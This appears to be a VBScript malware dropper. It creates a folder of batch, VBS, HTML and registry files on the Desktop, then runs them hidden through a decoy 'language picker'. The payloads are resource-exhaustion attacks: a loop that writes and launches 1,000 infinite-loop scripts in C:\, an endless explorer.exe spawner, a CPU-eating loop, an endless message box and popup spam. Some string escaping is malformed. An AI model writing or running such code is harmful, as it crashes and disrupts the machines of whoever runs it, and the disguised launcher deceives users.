
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
desktop = WshShell.SpecialFolders("Desktop")
rootFolder = desktop & "\samsungphone21"

If Not fso.FolderExists(rootFolder) Then fso.CreateFolder(rootFolder)

Set batMain = fso.CreateTextFile(rootFolder & "\ediloniom.bat", True)
batMain.WriteLine "@echo off"
batMain.WriteLine "for /L %%i in (1,1,1000) do ("
batMain.WriteLine "  echo ^<job^> > C:\brick%%i.wsf"
batMain.WriteLine "  echo ^<script language=\"VBScript\"^> >> C:\brick%%i.wsf"
batMain.WriteLine "  echo Do While True: Loop >> C:\brick%%i.wsf"
batMain.WriteLine "  echo ^</script^> >> C:\brick%%i.wsf"
batMain.WriteLine "  echo ^</job^> >> C:\brick%%i.wsf"
batMain.WriteLine "  start /b C:\brick%%i.wsf"
batMain.WriteLine ")"
batMain.Close

Set spamBat = fso.CreateTextFile(rootFolder & "\584597458475.bat", True)
spamBat.WriteLine "@echo off"
spamBat.WriteLine ":loop"
spamBat.WriteLine "start explorer.exe"
spamBat.WriteLine "goto loop"
spamBat.Close

wsFolder = rootFolder & "\wscriptrameater"
If Not fso.FolderExists(wsFolder) Then fso.CreateFolder(wsFolder)
Set rameaterVBS = fso.CreateTextFile(wsFolder & "\rameater.vbs", True)
rameaterVBS.WriteLine "Do While True"
rameaterVBS.WriteLine "Loop"
rameaterVBS.Close

langFolder = rootFolder & "\languagepicker75654"
If Not fso.FolderExists(langFolder) Then fso.CreateFolder(langFolder)
Set langPickerBat = fso.CreateTextFile(langFolder & "\languagepicker.bat", True)
langPickerBat.WriteLine "@echo off"
langPickerBat.WriteLine "echo Select your language:"
langPickerBat.WriteLine "echo 1. English"
langPickerBat.WriteLine "echo 2. Spanish"
langPickerBat.WriteLine "set /p lang=Choose 1 or 2:"
langPickerBat.WriteLine "if %lang%==1 goto runmain"
langPickerBat.WriteLine "if %lang%==2 goto runmain"
langPickerBat.WriteLine ":runmain"
langPickerBat.WriteLine "call ..\ediloniom.bat"
langPickerBat.Close

Set launcher999 = fso.CreateTextFile(rootFolder & "\launcher999.vbs", True)
launcher999.WriteLine "Set WshShell = CreateObject(\"WScript.Shell\")"
launcher999.WriteLine "WshShell.Run \"cmd /c \\\"\" & langFolder & "\\languagepicker.bat\\\"\"", 1, True"
launcher999.Close

Set reg1 = fso.CreateTextFile(rootFolder & "\eeyudre.reg", True)
reg1.WriteLine "Windows Registry Editor Version 5.00"
reg1.Close
Set reg2 = fso.CreateTextFile(rootFolder & "\7575577446556575485.reg", True)
reg2.WriteLine "Windows Registry Editor Version 5.00"
reg2.Close
Set reg3 = fso.CreateTextFile(rootFolder & "\45745755gghghhg.reg", True)
reg3.WriteLine "Windows Registry Editor Version 5.00"
reg3.Close
Set reg4 = fso.CreateTextFile(rootFolder & "\edenioliumertyuiop.reg", True)
reg4.WriteLine "Windows Registry Editor Version 5.00"
reg4.Close

Set loopMsg = fso.CreateTextFile(rootFolder & "\loopmsgbox.vbs", True)
loopMsg.WriteLine "Do"
loopMsg.WriteLine "  MsgBox \"Here it goes\", vbOKOnly, \"Warning\""
loopMsg.WriteLine "Loop"
loopMsg.Close

Set htmlLauncher = fso.CreateTextFile(rootFolder & "\simplelauncher.html", True)
htmlLauncher.WriteLine "<!DOCTYPE html>"
htmlLauncher.WriteLine "<html><head><title>Launcher</title></head><body>"
htmlLauncher.WriteLine "<script>"
htmlLauncher.WriteLine "if(confirm('Click OK to open files')) {"
htmlLauncher.WriteLine "  for(let i=0;i<10;i++) {"
htmlLauncher.WriteLine "    let w = window.open('hereitgoes'+i+'.html','_blank');"
htmlLauncher.WriteLine "    w.document.write('<html><body>Here it goes</body></html>');"
htmlLauncher.WriteLine "    w.document.close();"
htmlLauncher.WriteLine "  }"
htmlLauncher.WriteLine "  window.close();"
htmlLauncher.WriteLine "}"
htmlLauncher.WriteLine "</script></body></html>"
htmlLauncher.Close

WshShell.Run """" & rootFolder & "\launcher999.vbs""", 0, False
